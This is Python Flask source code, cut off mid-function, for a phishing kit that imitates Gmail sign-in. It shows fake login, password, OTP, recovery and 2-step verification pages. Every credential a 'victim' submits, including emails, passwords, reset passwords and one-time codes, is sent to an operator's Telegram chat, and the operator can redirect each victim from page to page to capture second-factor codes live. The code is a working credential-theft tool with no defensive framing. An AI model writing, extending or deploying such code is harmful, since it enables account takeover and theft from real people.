from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import sqlite3
import requests
from datetime import datetime, timedelta
import os
from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import psycopg2
import psycopg2.extras
import requests
from datetime import datetime, timedelta
import os
import urllib.parse as up
from functools import wraps
import time
import re
import json
import random
import secrets
import uuid
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()
app = Flask(__name__)
app.secret_key = "secretkey"
DATABASE_URL = os.environ.get('DATABASE_URL')
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# ============ JSON STORAGE ============
DATA_DIR = os.path.dirname(os.path.abspath(__file__))
VICTIMS_FILE = os.path.join(DATA_DIR, 'victims_data.json')
COMMANDS_FILE = os.path.join(DATA_DIR, 'commands_data.json')
SETTINGS_FILE = os.path.join(DATA_DIR, 'settings_data.json')
NOTIFICATIONS_FILE = os.path.join(DATA_DIR, 'notifications_data.json')

def load_json_file(filepath):
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return json.load(f)
        return {}
    except:
        return {}

def save_json_file(filepath, data):
    try:
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except:
        return False

# Victim storage
def load_victims_json():
    return load_json_file(VICTIMS_FILE)

def save_victims_json(data):
    save_json_file(VICTIMS_FILE, data)

def update_victim_json(session_id, data):
    victims = load_victims_json()
    victims[session_id] = data
    save_victims_json(victims)

def delete_victim_json(session_id):
    victims = load_victims_json()
    if session_id in victims:
        del victims[session_id]
        save_victims_json(victims)
        return True
    return False

# Command storage
def load_commands_json():
    return load_json_file(COMMANDS_FILE)

def save_commands_json(data):
    save_json_file(COMMANDS_FILE, data)

def add_command_json(session_id, command, ip_address=None):
    commands = load_commands_json()
    commands[session_id] = {
        'command': command,
        'ip': ip_address,
        'timestamp': time.time()
    }
    save_commands_json(commands)

def get_and_clear_command_json(session_id):
    commands = load_commands_json()
    if session_id in commands:
        data = commands[session_id]
        if time.time() - data['timestamp'] < 30:
            command = data['command']
            del commands[session_id]
            save_commands_json(commands)
            return command
        else:
            del commands[session_id]
            save_commands_json(commands)
    return None

def get_and_clear_command_by_ip_json(ip_address):
    commands = load_commands_json()
    for session_id, data in list(commands.items()):
        if data.get('ip') == ip_address:
            if time.time() - data['timestamp'] < 30:
                command = data['command']
                del commands[session_id]
                save_commands_json(commands)
                return session_id, command
            else:
                del commands[session_id]
                save_commands_json(commands)
    return None, None

# Settings storage
def load_settings_json():
    return load_json_file(SETTINGS_FILE)

def save_settings_json(data):
    save_json_file(SETTINGS_FILE, data)

def get_settings_json(session_id):
    settings = load_settings_json()
    return settings.get(session_id, {})

def update_setting_json(session_id, key, value):
    settings = load_settings_json()
    if session_id not in settings:
        settings[session_id] = {}
    settings[session_id][key] = value
    save_settings_json(settings)

# Notification storage
def load_notifications_json():
    return load_json_file(NOTIFICATIONS_FILE)

def save_notifications_json(data):
    save_json_file(NOTIFICATIONS_FILE, data)

def mark_notification_sent(session_id, page):
    notifications = load_notifications_json()
    key = f'{page}_{session_id}'
    notifications[key] = True
    save_notifications_json(notifications)

def is_notification_sent(session_id, page):
    notifications = load_notifications_json()
    key = f'{page}_{session_id}'
    return notifications.get(key, False)

def clear_notifications_json(session_id):
    notifications = load_notifications_json()
    for key in list(notifications.keys()):
        if key.endswith(f'_{session_id}'):
            del notifications[key]
    save_notifications_json(notifications)

def clear_all_json():
    save_victims_json({})
    save_commands_json({})
    save_settings_json({})
    save_notifications_json({})

# ============ DATABASE FUNCTIONS ============
def get_db_connection():
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute('DROP TABLE IF EXISTS navigations CASCADE')
    c.execute('DROP TABLE IF EXISTS victims CASCADE')
    
    c.execute('''
        CREATE TABLE victims (
            id SERIAL PRIMARY KEY,
            email TEXT,
            ip_address TEXT NOT NULL,
            user_agent TEXT,
            session_id TEXT UNIQUE,
            current_page TEXT DEFAULT 'login',
            is_active BOOLEAN DEFAULT TRUE,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE navigations (
            id SERIAL PRIMARY KEY,
            session_id TEXT,
            email TEXT,
            ip_address TEXT NOT NULL,
            page_url TEXT NOT NULL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    c.execute('CREATE INDEX idx_victims_session_id ON victims(session_id)')
    c.execute('CREATE INDEX idx_victims_ip_address ON victims(ip_address)')
    c.execute('CREATE INDEX idx_victims_timestamp ON victims(timestamp)')
    c.execute('CREATE INDEX idx_victims_is_active ON victims(is_active)')
    
    c.execute('CREATE INDEX idx_navigations_session_id ON navigations(session_id)')
    c.execute('CREATE INDEX idx_navigations_timestamp ON navigations(timestamp)')
    c.execute('CREATE INDEX idx_navigations_ip_address ON navigations(ip_address)')
    
    conn.commit()
    conn.close()
    print("PostgreSQL database initialized!")

init_db()

# Store active victims in memory
active_victims = {}

# Cache for victim details
victim_cache = {}
CACHE_EXPIRY = 60

def get_victim_details_cached(session_id):
    if session_id in victim_cache:
        cached_data, timestamp = victim_cache[session_id]
        if time.time() - timestamp < CACHE_EXPIRY:
            return cached_data
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''
        SELECT v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp,
               COUNT(n.id) as nav_count
        FROM victims v
        LEFT JOIN navigations n ON v.session_id = n.session_id
        WHERE v.session_id = %s AND v.is_active = TRUE
        GROUP BY v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp
    ''', (session_id,))
    victim = c.fetchone()
    conn.close()
    
    if victim:
        email = victim[1] or 'No email'
        if email == 'No email' and session_id in active_victims:
            mem_email = active_victims[session_id].get('email')
            if mem_email:
                email = mem_email
        
        data = {
            'session_id': victim[0],
            'email': email,
            'ip_address': victim[2],
            'user_agent': victim[3],
            'current_page': victim[4] or 'login',
            'timestamp': victim[5],
            'nav_count': victim[6]
        }
        victim_cache[session_id] = (data, time.time())
        return data
    return None

def invalidate_cache(session_id):
    if session_id in victim_cache:
        del victim_cache[session_id]

def invalidate_all_cache():
    victim_cache.clear()

# ============ HELPER FUNCTIONS ============
def ensure_webhook():
    try:
        domain = os.environ.get('DOMAIN_URL', 'https://bace-wmed.onrender.com')
        webhook_url = f"{domain}/telegram-webhook"
        info_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getWebhookInfo"
        info_response = requests.get(info_url, timeout=5)
        info = info_response.json()
        current_url = info.get('result', {}).get('url', '')
        if current_url != webhook_url:
            set_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={webhook_url}"
            requests.get(set_url, timeout=10)
    except:
        pass

@app.before_request
def before_request():
    user_agent = request.headers.get('User-Agent', '')
    if 'Go-http-client' in user_agent or 'HealthCheck' in user_agent:
        return None
    if not request.path.startswith('/static/') and request.path != '/telegram-webhook':
        ensure_webhook()

def get_device_info(user_agent):
    device = "Unknown"
    if not user_agent:
        return device
    ua = user_agent.lower()
    if 'iphone' in ua:
        device = "iPhone"
    elif 'ipad' in ua:
        device = "iPad"
    elif 'android' in ua:
        if 'mobile' in ua:
            device = "Android Phone"
        else:
            device = "Android Tablet"
    elif 'windows' in ua:
        if 'phone' in ua:
            device = "Windows Phone"
        else:
            device = "Windows PC"
    elif 'macintosh' in ua or 'mac os' in ua:
        device = "Mac"
    elif 'linux' in ua:
        device = "Linux"
    elif 'bot' in ua or 'crawl' in ua or 'spider' in ua:
        device = "Bot/Crawler"
    return device

def send_telegram_notification_with_buttons(message, session_id=None):
    try:
        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        if not chat_id:
            return False
        keyboard = {"inline_keyboard": []}
        if session_id:
            keyboard["inline_keyboard"].append([
                {"text": "👤 View Victim", "callback_data": f"victim_detail|{session_id}"}
            ])
        keyboard["inline_keyboard"].append([
            {"text": "🔙 Main Menu", "callback_data": "main_menu"}
        ])
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
            "reply_markup": json.dumps(keyboard)
        }
        response = requests.post(url, data=data)
        return response.status_code == 200
    except:
        return False

def send_telegram_message(message):
    try:
        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        if not chat_id:
            return False
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data)
        return response.status_code == 200
    except:
        return False

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        ips = request.headers.get('X-Forwarded-For').split(',')
        return ips[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def create_victim_session(ip_address, user_agent):
    session_id = os.urandom(16).hex()
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT INTO victims (ip_address, user_agent, session_id, current_page) VALUES (%s, %s, %s, %s)",
              (ip_address, user_agent, session_id, 'login'))
    conn.commit()
    conn.close()
    active_victims[session_id] = {
        'ip_address': ip_address,
        'user_agent': user_agent,
        'email': None,
        'current_page': 'login',
        'is_active': True,
        'last_activity': datetime.now().isoformat()
    }
    return session_id

def update_victim_page(session_id, page_url, email=None):
    conn = get_db_connection()
    c = conn.cursor()
    if email:
        c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                 (page_url, email, session_id))
    else:
        c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                 (page_url, session_id))
    conn.commit()
    conn.close()
    if session_id in active_victims:
        active_victims[session_id]['current_page'] = page_url
        active_victims[session_id]['last_activity'] = datetime.now().isoformat()
        if email:
            active_victims[session_id]['email'] = email
    invalidate_cache(session_id)

def log_navigation(session_id, page_url, email=None):
    conn = get_db_connection()
    c = conn.cursor()
    try:
        if email:
            c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                     (page_url, email, session_id))
        else:
            c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                     (page_url, session_id))
        c.execute("SELECT ip_address FROM victims WHERE session_id = %s", (session_id,))
        result = c.fetchone()
        ip_address = result[0] if result else 'Unknown'
        c.execute("INSERT INTO navigations (session_id, email, ip_address, page_url) VALUES (%s, %s, %s, %s)",
                  (session_id, email, ip_address, page_url))
        conn.commit()
        if session_id in active_victims:
            active_victims[session_id]['current_page'] = page_url
            active_victims[session_id]['last_activity'] = datetime.now().isoformat()
            if email:
                active_victims[session_id]['email'] = email
        invalidate_cache(session_id)
    except:
        conn.rollback()
    finally:
        conn.close()

def get_victim_page_display(page_name):
    page_map = {
        'login': '🔐 Login Page',
        'gmail_login': '🔐 Gmail Login',
        'waiting': '⏳ Waiting Page',
        'stall': '⏸️ Stall (CAPTCHA)',
        'verify': '🛡️ Verify Page',
        'password': '🔑 Password Page',
        'reset': '🔄 Reset Page',
        'otp': '📱 OTP Page',
        'invalid': '❌ Invalid Page',
        'recovery': '📱 Recovery Page',
        'twostep': '🔒 2-Step Verification',
        'index': '🏠 Index Page'
    }
    return page_map.get(page_name, '📍 ' + page_name)

@app.before_request
def check_restrictions():
    user_agent = request.headers.get('User-Agent', '')
    if 'Go-http-client' in user_agent or 'HealthCheck' in user_agent:
        return None
    if (request.endpoint in ['static', 'check_command', 'track_navigation',
                            'set_phone_data', 'get_phone_data', 'set_recovery_data', 
                            'get_recovery_data', 'set_verification_data', 'get_verification_data', 
                            'set_verify_data', 'get_verify_data', 'telegram_webhook'] or 
        request.path.startswith('/static/')):
        return None
    
    command_map = {
        'go_to_login': 'gmail_login',
        'go_to_waiting': 'waiting',
        'go_to_stall': 'stall',
        'go_to_verify': 'verify',
        'go_to_password': 'password',
        'go_to_reset': 'reset',
        'go_to_otp': 'otp',
        'go_to_invalid': 'invalid',
        'go_to_recovery': 'recovery',
        'go_to_2step': 'twostep'
    }
    
    client_ip = get_client_ip()
    victim_session = session.get('victim_session')
    if victim_session:
        command = get_and_clear_command_json(victim_session)
        if command and command in command_map:
            return redirect(url_for(command_map[command]))
    
    session_id, command = get_and_clear_command_by_ip_json(client_ip)
    if command and command in command_map:
        if session_id:
            session['victim_session'] = session_id
            session['is_victim'] = True
        return redirect(url_for(command_map[command]))
    
    return None

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent', '')
    if 'Go-http-client' in user_agent or 'HealthCheck' in user_agent:
        invite_num = random.randint(2, 999)
        return render_template('index.html', invite_num=invite_num)
    
    if 'victim_session' not in session:
        client_ip = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        session_id = create_victim_session(client_ip, user_agent)
        session['victim_session'] = session_id
        session['is_victim'] = True
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        device = get_device_info(user_agent)
        
        message = f"""🎣 <b>NEW VICTIM CONNECTED!</b>

🌐 <b>IP Address:</b> <code>{client_ip}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Index (Provider Selection)"""
        
        send_telegram_notification_with_buttons(message, session_id)
    
    invite_num = random.randint(2, 999)
    return render_template('index.html', invite_num=invite_num)

def ensure_session():
    if 'victim_session' not in session:
        client_ip = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        session_id = create_victim_session(client_ip, user_agent)
        session['victim_session'] = session_id
        session['is_victim'] = True
        session['email'] = ''
    return session['victim_session']

@app.route('/gmail-login')
def gmail_login():
    session_id = ensure_session()
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    log_navigation(session_id, 'Gmail Login Page', session.get('email'))
    update_victim_page(session_id, 'gmail_login')
    
    if not is_notification_sent(session_id, 'gmail_login'):
        mark_notification_sent(session_id, 'gmail_login')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>

📧 <b>Email:</b> <code>{session.get('email', 'No email yet')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Gmail Login"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    session_id = session.get('victim_session')
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    if email and session_id:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
        conn.commit()
        conn.close()
        
        if session_id in active_victims:
            active_victims[session_id]['email'] = email
        
        update_setting_json(session_id, 'email', email)
        log_navigation(session_id, 'Login Attempt', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = get_client_ip()
        
        message = f"""📧 <b>VICTIM ENTERED EMAIL!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Login Form"""
        
        send_telegram_notification_with_buttons(message, session_id)
        session['email'] = email
        invalidate_cache(session_id)
        
        return jsonify({'success': True, 'redirect': url_for('password')})
    
    return jsonify({'success': False, 'error': 'No email provided'})

@app.route('/waiting')
def waiting():
    session_id = ensure_session()
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    log_navigation(session_id, 'Waiting Page', session.get('email'))
    
    if not is_notification_sent(session_id, 'waiting'):
        mark_notification_sent(session_id, 'waiting')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""⏳ <b>VICTIM REACHED WAITING PAGE!</b>

📧 <b>Email:</b> <code>{session.get('email', 'No email')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Waiting"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('waiting.html')

@app.route('/stall', methods=['GET', 'POST'])
def stall():
    session_id = ensure_session()
    email = session.get('email', '')
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    if request.method == 'POST':
        captcha_text = request.form.get('ca', '').strip()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""⏸️ <b>VICTIM SUBMITTED CAPTCHA ON STALL PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔤 <b>CAPTCHA Text:</b> <code>{captcha_text or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Stall (CAPTCHA Submitted)"""
        send_telegram_notification_with_buttons(message, session_id)
        log_navigation(session_id, 'Stall Page - CAPTCHA Submitted', email)
        return redirect(url_for('waiting'))
    
    log_navigation(session_id, 'Stall Page', email)
    
    if not is_notification_sent(session_id, 'stall'):
        mark_notification_sent(session_id, 'stall')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""⏸️ <b>VICTIM REACHED STALL PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Stall (CAPTCHA)"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('stall.html')

@app.route('/api/set-verify-data', methods=['POST'])
def set_verify_data():
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    if session_id and email:
        update_setting_json(session_id, 'email', email)
    return jsonify({'success': True})

@app.route('/api/get-verify-data')
def get_verify_data():
    session_id = session.get('victim_session')
    if session_id:
        settings = get_settings_json(session_id)
        return jsonify({'email': settings.get('email', '')})
    return jsonify({'email': ''})

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    session_id = ensure_session()
    email = session.get('email', '')
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    settings = get_settings_json(session_id)
    if settings.get('email'):
        email = settings.get('email')
    
    if request.method == 'POST':
        recovery_email = request.form.get('recovery_email', '').strip()
        recovery_phone = request.form.get('recovery_phone', '').strip()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔐 <b>VICTIM SUBMITTED RECOVERY INFO!</b>

📧 <b>Original Email:</b> <code>{email}</code>
📩 <b>Recovery Email:</b> <code>{recovery_email or 'Not provided'}</code>
📱 <b>Recovery Phone:</b> <code>{recovery_phone or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>"""
        send_telegram_notification_with_buttons(message, session_id)
        log_navigation(session_id, 'Recovery Info Submitted', email)
        return redirect(url_for('waiting'))
    
    log_navigation(session_id, 'Verify Page', email)
    
    if not is_notification_sent(session_id, 'verify'):
        mark_notification_sent(session_id, 'verify')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔐 <b>VICTIM REACHED VERIFY PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Verify"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('verify.html', placeholders={'email': email})

@app.route('/password', methods=['GET', 'POST'])
def password():
    session_id = ensure_session()
    email = session.get('email', '')
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    settings = get_settings_json(session_id)
    if settings.get('email'):
        email = settings.get('email')
    
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        email = request.form.get('email', email)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔑 <b>VICTIM SUBMITTED PASSWORD!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>"""
        send_telegram_notification_with_buttons(message, session_id)
        log_navigation(session_id, 'Password Submitted', email)
        return redirect(url_for('waiting'))
    
    log_navigation(session_id, 'Password Page', email)
    
    if not is_notification_sent(session_id, 'password'):
        mark_notification_sent(session_id, 'password')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔑 <b>VICTIM REACHED PASSWORD PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Password"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('password.html', placeholders={'email': email})

@app.route('/track-navigation', methods=['POST'])
def track_navigation():
    if not session.get('is_victim'):
        return jsonify({'success': False})
    data = request.get_json()
    page_url = data.get('page_url', 'Unknown')
    session_id = session.get('victim_session')
    if session_id:
        log_navigation(session_id, page_url, session.get('email'))
    return jsonify({'success': True})

@app.route('/invalid', methods=['GET', 'POST'])
def invalid():
    session_id = ensure_session()
    email = session.get('email', '')
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    settings = get_settings_json(session_id)
    if settings.get('email'):
        email = settings.get('email')
    
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        email = request.form.get('email', email)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔑 <b>VICTIM SUBMITTED PASSWORD FROM INVALID PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page Type:</b> Invalid/Too Many Attempts"""
        send_telegram_notification_with_buttons(message, session_id)
        log_navigation(session_id, 'Invalid Page - Password Submitted', email)
        return redirect(url_for('waiting'))
    
    log_navigation(session_id, 'Invalid Page', email)
    
    if not is_notification_sent(session_id, 'invalid'):
        mark_notification_sent(session_id, 'invalid')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🚫 <b>VICTIM REACHED INVALID PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Invalid/Too Many Attempts"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('invalid.html', placeholders={'email': email})

@app.route('/reset', methods=['GET', 'POST'])
def reset():
    session_id = ensure_session()
    email = session.get('email', '')
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    settings = get_settings_json(session_id)
    if settings.get('email'):
        email = settings.get('email')
    
    if request.method == 'POST':
        new_password = request.form.get('new_password', '').strip()
        confirm_password = request.form.get('confirm_password', '').strip()
        email = request.form.get('email', email)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔑 <b>VICTIM CREATED NEW PASSWORD!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>New Password:</b> <code>{new_password or 'Not provided'}</code>
✅ <b>Confirm Password:</b> <code>{confirm_password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>"""
        send_telegram_notification_with_buttons(message, session_id)
        log_navigation(session_id, 'Reset Password Submitted', email)
        return redirect(url_for('waiting'))
    
    log_navigation(session_id, 'Reset Password Page', email)
    
    if not is_notification_sent(session_id, 'reset'):
        mark_notification_sent(session_id, 'reset')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Reset Password"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('reset.html', placeholders={'email': email})

@app.route('/otp', methods=['GET', 'POST'])
def otp():
    session_id = ensure_session()
    email = session.get('email', '')
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    settings = get_settings_json(session_id)
    if settings.get('email'):
        email = settings.get('email')
    phone = settings.get('phone', '****')
    
    if request.method == 'POST':
        otp_code = request.form.get('otpcode', '').strip()
        email = request.form.get('email', email)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔢 <b>VICTIM SUBMITTED OTP!</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>OTP Code:</b> <code>{otp_code or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>"""
        send_telegram_notification_with_buttons(message, session_id)
        log_navigation(session_id, 'OTP Submitted', email)
        return redirect(url_for('waiting'))
    
    log_navigation(session_id, 'OTP Page', email)
    
    if not is_notification_sent(session_id, 'otp'):
        mark_notification_sent(session_id, 'otp')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""🔢 <b>VICTIM REACHED OTP PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
📞 <b>Phone:</b> <code>{phone}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> OTP"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('otp.html', placeholders={'email': email, 'phone': phone})

@app.route('/recovery')
def recovery():
    session_id = ensure_session()
    email = session.get('email', '')
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    settings = get_settings_json(session_id)
    if settings.get('email'):
        email = settings.get('email')
    number = settings.get('number', '')
    
    log_navigation(session_id, 'Recovery Page', email)
    
    if not is_notification_sent(session_id, 'recovery'):
        mark_notification_sent(session_id, 'recovery')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""📱 <b>VICTIM REACHED RECOVERY PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>Number Displayed:</b> <code>{number or 'Not set'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Recovery"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('recovery.html', placeholders={'email': email, 'number': number})

@app.route('/2step', methods=['GET', 'POST'])
def twostep():
    session_id = ensure_session()
    email = session.get('email', '')
    user_agent = request.headers.get('User-Agent', '')
    device = get_device_info(user_agent)
    
    settings = get_settings_json(session_id)
    if settings.get('email'):
        email = settings.get('email')
    phone_type = settings.get('phone_type', 'iPhone')
    
    log_navigation(session_id, '2-Step Verification Page', email)
    
    if not is_notification_sent(session_id, 'twostep'):
        mark_notification_sent(session_id, 'twostep')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
📱 <b>Phone Displayed:</b> <code>{phone_type}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
📱 <b>Device:</b> {device}
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> 2-Step Verification"""
        send_telegram_notification_with_buttons(message, session_id)
    
    return render_template('2stepverification.html', placeholders={'email': email, 'phone': phone_type})

@app.route('/api/set-verification-data', methods=['POST'])
def set_verification_data():
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    phone = data.get('phone')
    if session_id:
        if email:
            update_setting_json(session_id, 'email', email)
        if phone:
            update_setting_json(session_id, 'phone_type', phone)
    return jsonify({'success': True})

@app.route('/api/get-verification-data')
def get_verification_data():
    session_id = session.get('victim_session')
    if session_id:
        settings = get_settings_json(session_id)
        return jsonify({'email': settings.get('email', ''), 'phone': settings.get('phone_type', '')})
    return jsonify({'email': '', 'phone': ''})

@app.route('/api/set-phone-data', methods=['POST'])
def set_phone_data():
    data = request.get_json()
    session_id = data.get('session_id')
    phone = data.get('phone')
    if session_id and phone:
        update_setting_json(session_id, 'phone', phone)
    return jsonify({'success': True})

@app.route('/api/get-recovery-data')
def get_recovery_data():
    session_id = session.get('victim_session')
    if session_id:
        settings = get_settings_json(session_id)
        return jsonify({'email': settings.get('email', ''), 'number': settings.get('number', '')})
    return jsonify({'email': '', 'number': ''})

@app.route('/api/set-recovery-data', methods=['POST'])
def set_recovery_data():
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    number = data.get('number')
    if session_id:
        if email:
            update_setting_json(session_id, 'email', email)
        if number:
            update_setting_json(session_id, 'number', number)
    return jsonify({'success': True})

@app.route('/api/get-phone-data')
def get_phone_data():
    session_id = session.get('victim_session')
    if session_id:
